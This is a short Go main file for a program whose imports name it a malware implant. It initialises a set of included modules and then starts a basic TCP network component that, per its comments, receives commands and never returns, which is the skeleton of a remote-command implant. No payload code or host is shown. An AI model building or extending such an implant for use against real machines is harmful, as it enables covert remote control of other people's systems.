package main

import (
	"malware/implant/basic_tcp_network"
	"malware/implant/included_modules"
)

func main() {
	for _, module := range included_modules.Modules {
		module.Init()
	}

	network := basic_tcp_network.Create() // Network is always last to init (Can't get commands until other modules started)
	network.Init()                        // Shouldn't return
}
